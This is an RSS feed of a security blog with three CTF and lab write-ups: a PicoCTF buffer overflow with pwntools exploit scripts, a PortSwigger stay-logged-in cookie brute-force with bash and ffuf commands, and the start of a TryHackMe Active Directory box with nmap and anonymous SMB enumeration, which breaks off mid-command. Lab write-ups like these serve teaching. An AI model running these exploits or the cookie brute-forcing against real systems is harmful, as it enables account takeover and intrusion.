<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>Posts on Ep1cac</title>
    <link>http://localhost:1313/posts/</link>
    <description>Recent content in Posts on Ep1cac</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>Ep1cac</copyright>
    <lastBuildDate>Wed, 09 Oct 2024 14:23:13 -0500</lastBuildDate><atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.svg</icon>
    
    
    <item>
      <title>PicoCTF: Buffer Overflow 2</title>
      <link>http://localhost:1313/posts/pico_buff2/</link>
      <pubDate>Wed, 09 Oct 2024 14:23:13 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/pico_buff2/</guid>
      <description><![CDATA[<h3 id="description">Description</h3>
<p>Buffer Overflow 2 is a&hellip;</p>
<h3 id="walkthrough">Walkthrough</h3>
<h4 id="foreward">Foreward</h4>
<p>After downloading the vulnerable binary and its source code, the first thing I did was to view the source code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFSIZE 100
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FLAGSIZE 64
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg2) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(buf,FLAGSIZE,f);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xCAFEF00D</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xF00DF00D</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(buf);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[BUFSIZE];
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(buf);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(buf);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">gid_t</span> gid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresgid</span>(gid, gid, gid);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Please enter your string: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">vuln</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It is apparent that the binary is using the vulnerable <code>gets()</code>
function with a buffer size of 100 bytes. We will need to overflow the buffer and
call <code>win()</code> as well as pass in two arguments, <code>0xCAFEF00D</code> and
<code>0XF00DF00D</code>, in order to complete this challenge.</p>
<p>We can also see that we need a dummy flag in order for the program to execute correctly.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Writeups/pico/buff2]
└─$ echo &#39;pico{debug}&#39; &gt; flag.txt
</code></pre><h4 id="exploitation">Exploitation</h4>
<p>To overflow the buffer, we first need to find the offset of the eip pointer. eip stands for
&ldquo;Extended Instruction Pointer&rdquo; and as its name suggests, points to the next instruction to be
executed in x86 systems. We want to write the address of <code>win()</code> to it. To find the address,
we can analyze <code>vuln</code> in gdb&hellip;</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Writeups/pico/buff2]
└─$ gdb vuln
</code></pre><p>&hellip; and find the buffer allocation.</p>
<p><img src="/img/pico/buff2/vuln_gets_alloc.png" alt="GDB vuln buffer size"></p>
<p>Notice that the address of offset <code>ebp-0x6c</code> is pushed onto the stack and is
read by <code>gets()</code>. This means that after calling the <code>gets</code> function, there will be
108 (0x6c) bytes of buffer between the start of the buffer and the <code>ebp</code> pointer.</p>
<div style="display: flex; justify-content: center;">
    <table>
        <td style="text-align: center;">
            <table>
  <thead>
      <tr>
          <th style="text-align: left">High Address</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">&hellip;</td>
      </tr>
      <tr>
          <td style="text-align: left">eip (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">ebp (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">buffer + padding (108 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">&hellip;</td>
      </tr>
      <tr>
          <td style="text-align: left">Low Address</td>
      </tr>
  </tbody>
</table>

        </td>
    </table>
</div>
<p><code>eip</code> is at a higher address immediately after <code>ebp</code>. Since pointers are 4 bytes on x86 binaries,
<code>eip</code> is 112 (108 + 4) bytes from the start of the buffer. We will therefore need 112 bytes of padding
before in our payload before it starts overwriting <code>eip</code>.</p>
<p>Preliminary payload: 112 bytes padding + address of win().</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>addr_main <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>		padding,
</span></span><span style="display:flex;"><span>		addr_win
</span></span><span style="display:flex;"><span>		]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>I didn&rsquo;t get a clear indication as to whether my payload succeeded, so I added a breakpoint
at the <code>win()</code> function through gdb. If <code>win()</code> is called, the program will pause execution.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>addr_win <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>		padding,
</span></span><span style="display:flex;"><span>		addr_win
</span></span><span style="display:flex;"><span>		]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>g <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>attach(p, gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b *win
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        r &lt; payload
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img src="/img/pico/buff2/win_stop.png" alt="win() function stop"></p>
<p>We do break, meaning our exploit successfully called <code>win()</code>. Now, we need to add
the arguments <code>0XCAFEF00D</code> and <code>0XF00DF00D</code>.</p>
<div style="display: flex; justify-content: center;">
    <table>
        <td style="text-align: center;">
            <table>
  <thead>
      <tr>
          <th style="text-align: left">High Address</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">&hellip;</td>
      </tr>
      <tr>
          <td style="text-align: left">arg2 (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">arg1 (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">eip (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">ebp (4 bytes)</td>
      </tr>
      <tr>
          <td style="text-align: left">&hellip;</td>
      </tr>
      <tr>
          <td style="text-align: left">Low Address</td>
      </tr>
  </tbody>
</table>

        </td>
    </table>
</div>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Portswigger Lab: Brute-forcing a stay-logged-in cookie</title>
      <link>http://localhost:1313/posts/cookie_brute/</link>
      <pubDate>Mon, 23 Sep 2024 10:59:43 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/cookie_brute/</guid>
      <description><![CDATA[<h3 id="description">Description</h3>
<p>The &ldquo;Brute-forcing a stay-logged-in cookie&rdquo; lab by PortSwigger features a web application whose stay-logged-in cookies are vulnerable to attack.</p>
<h3 id="walkthrough">Walkthrough</h3>
<p>Navigate to the login page under &ldquo;My account&rdquo;. We will first create a stay-logged-in cookie with the user credentials given to us. Make sure check &ldquo;Stay logged in&rdquo;.</p>
<p><img src="/img/portswigger/cookie-brute/stay_logged_in.png" alt="Login and enable persistent cookies"></p>
<p>Now we can copy the cookie to analyze. Hit <code>Ctr-Shift-i</code> to open the Developer Tools panel and head to the &ldquo;Storage&rdquo; section. The value for the &ldquo;stay-logged-on&rdquo; field is our cookie.</p>
<p><img src="/img/portswigger/cookie-brute/stay_logged_in_cookie.png" alt="Stay-logged-in cookie"></p>
<p>The cookie is encoded in base64. Decoding it reveals that it is composed of the our username, &ldquo;:&rdquo;, and a hash.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ echo &#39;d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw&#39; | base64 -d                                    
wiener:51dc30ddc473d43a6011e9ebba6ca770
</code></pre><p>Given that our username was used as part of the cookie, we can reasonably infer that the hash is based on a predictable value like a timestamp, password, or maybe even the username again. In this case, it&rsquo;s the MD5 hash of our password. We can confirm this by hashing our password using MD5 and verifying it is identical to the hash in our cookie.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ echo -n &#39;peter&#39; | md5sum | cut -d &#39; &#39; -f1 
51dc30ddc473d43a6011e9ebba6ca770
</code></pre><p>We have now determined that the stay-logged-in cookie is <code>username:&lt;password MD5 hash&gt;</code> and base64-encoded. Since we have already been given a <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">list of passwords</a>, we can create a list of potential cookies for <code>carlos</code> by applying these rules. I provided a script that does this and saves the cookies into <code>cookies.txt</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># md5 hash -&gt; user:&lt;hash&gt; -&gt; base64 cookie</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read -r line
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span> | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span>  -f1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        cookie<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;carlos:</span>$hash<span style="color:#e6db74">&#34;</span> | base64<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$cookie<span style="color:#e6db74">&#34;</span> &gt;&gt; cookies.txt
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#66d9ef">$(</span>cat pass.txt<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><p>Now we can brute force the stay-logged-in cookie for <code>carlos</code>. Logout and start Burp Suite. We are going to login again as <code>wiener</code> again, but this time we are going to intercept our web requests. Forward the POST request but capture the GET request for your account details.</p>
<p><img src="/img/portswigger/cookie-brute/persistent_logon.png" alt="Web request"></p>
<p>Copy it and save it into a file. Change the <code>id</code> query string&rsquo;s value to <code>carlos</code> and replace the stay-logged-in cookie with <code>FUZZ</code>. Now, we can brute force the cookie.</p>
<pre tabindex="0"><code>ffuf -request request.txt -request-proto https -mode clusterbomb -w cookies.txt:FUZZ -r
</code></pre><p>We see a change in the webserver&rsquo;s response after supplying one of the cookies.</p>
<p><img src="/img/portswigger/cookie-brute/success.png" alt="Cookie brute force"></p>
<p>Now we can simply use our cookie to take over  <code>carlos</code>. Once again, we open the developer tools and head to storage &gt; cookies. Right click and add another item with the name as &ldquo;stay-logged-in&rdquo; and the value as the cookie we got.</p>
<p><img src="/img/portswigger/cookie-brute/add_cookie.png" alt="Add carlos&rsquo; cookie"></p>
<p>Refresh the page and we are now logged in as <code>carlos</code>.</p>
<p><img src="/img/portswigger/cookie-brute/carlos_pwned.png" alt="Takeover success"></p>
<hr>
<h3 id="beyond-pwn">Beyond Pwn</h3>
<p>Note that finding the cookie for <code>carlos</code> is similar to a password dictionary attack. In this particular though, there is a IP ban for incorrect login attempts. By brute forcing the cookie instead of password, we are able to bypass the IP ban.</p>
<p>Also worth mentioning is that we can also get the <code>carlos</code> user&rsquo;s password while brute forcing his cookie.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># md5 hash -&gt; user:&lt;hash&gt; -&gt; base64 cookie &amp;&amp; cookie-password map</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read -r line
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span> | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span>  -f1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        cookie<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;carlos:</span>$hash<span style="color:#e6db74">&#34;</span> | base64<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$cookie<span style="color:#e6db74">&#34;</span> &gt;&gt; cookies.txt
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$cookie<span style="color:#e6db74">: </span>$line<span style="color:#e6db74">&#34;</span> &gt;&gt; map.txt
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#66d9ef">$(</span>cat pass.txt<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><p>Once we successfully authenticate with a cookie, we can find its corresponding password through the map.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ grep &#39;Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx&#39; map.txt                    
Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx: thomas
</code></pre><p>This can be useful when checking for password reuse and may help us access more services in a real engagement.</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Enterprise</title>
      <link>http://localhost:1313/posts/enterprise/</link>
      <pubDate>Tue, 17 Sep 2024 15:11:37 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/enterprise/</guid>
      <description><![CDATA[<p><img src="/img/enterprise/enterprise.png#center" alt="Enterprise"></p>
<h3 id="description">Description</h3>
<p><a href="https://tryhackme.com/r/room/enterprise">Enterprise</a> is a Hard difficulty Active Directory box on Tryhackme. We are in an assumed compromise scenario where our only target is a domain controller on the internal network. While privilege escalation was straightforward, there are multiple rabbit holes for initial access.</p>
<h3 id="recon">Recon</h3>
<p>I began my recon on the machine was a nmap scan.</p>
<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Wed Sep 18 17:50:36 2024 as: nmap -p- -A -v -oN nmap.scan -T5 10.10.62.141
Increasing send delay for 10.10.62.141 from 0 to 5 due to 948 out of 2369 dropped probes since last increase.
Warning: 10.10.62.141 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.62.141
Host is up (0.21s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn&#39;t have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-18 18:02:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Issuer: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-17T17:46:46
| Not valid after:  2025-03-19T17:46:46
| MD5:   12f5:c3db:b128:72f4:9f89:6a26:be7a:899d
|_SHA-1: 2022:9e18:d0fb:90a4:ba39:9c9b:ef3c:504f:d485:d8ce
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2024-09-18T18:03:41+00:00
|_ssl-date: 2024-09-18T18:03:49+00:00; +50s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7990/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Log in to continue - Log in with Atlassian account
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49840/tcp open  msrpc         Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2016 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 Update 1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 49s, deviation: 0s, median: 49s
| smb2-time: 
|   date: 2024-09-18T18:03:42
|_  start_date: N/A

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   75.99 ms  10.13.0.1
2   ... 3
4   204.26 ms 10.10.62.141

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 18 18:03:05 2024 -- 1 IP address (1 host up) scanned in 749.00 seconds
</code></pre><p>Even if we were not told that our target was a domain controller (per the room description), it would quickly become apparent with the discovery of DC-specific ports and services like kerberos on port 88.</p>
<p>After identifying open services, I always look for quick wins next. I Noticed SMB anonymous access was allowed and we have read permission on several shares.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ netexec smb 10.10.62.141 -u &#39;Anonymous&#39; -p &#39;&#39; --shares
SMB         10.10.62.141    445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.62.141    445    LAB-DC           [+] LAB.ENTERPRISE.THM\Anonymous: 
SMB         10.10.62.141    445    LAB-DC           [*] Enumerated shares
SMB         10.10.62.141    445    LAB-DC           Share           Permissions     Remark
SMB         10.10.62.141    445    LAB-DC           -----           -----------     ------
SMB         10.10.62.141    445    LAB-DC           ADMIN$                          Remote Admin
SMB         10.10.62.141    445    LAB-DC           C$                              Default share
SMB         10.10.62.141    445    LAB-DC           Docs            READ            
SMB         10.10.62.141    445    LAB-DC           IPC$            READ            Remote IPC
SMB         10.10.62.141    445    LAB-DC           NETLOGON                        Logon server share 
SMB         10.10.62.141    445    LAB-DC           SYSVOL                          Logon server share 
SMB         10.10.62.141    445    LAB-DC           Users           READ            Users Share. Do Not Touch!
</code></pre><p><code>Docs</code> and <code>Users</code> in particular appeared worth digging further into. I took a look at <code>Docs</code> first.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.62.141/Docs -U Anonymous -N
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Mon Mar 15 02:47:35 2021
  ..                                  D        0  Mon Mar 15 02:47:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 02:46:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 02:45:24 2021

                15587583 blocks of size 4096. 9927627 blocks available
smb: \&gt;
</code></pre><p>There are two files, <code>RSA-Secured-Credentials.xlsx</code> and <code>RSA-Secured-Document-PII.docx</code>. These could be huge findings that allow us to breach the domain controller. I transferred the files to my attacker machine. The files were password protected, so I extracted the password hashes with <code>office2john</code> and started cracking them while I continued enumerating the machine (spoiler alert: I couldn&rsquo;t crack any of the hashes).</p>
<p>I took a look at the Users share next. After some digging, I came across a PowerShell history file for LAB_ADMIN in <code>\LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\</code>.</p>
<pre tabindex="0"><code>smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\&gt; get Consolehost_hisory.txt 
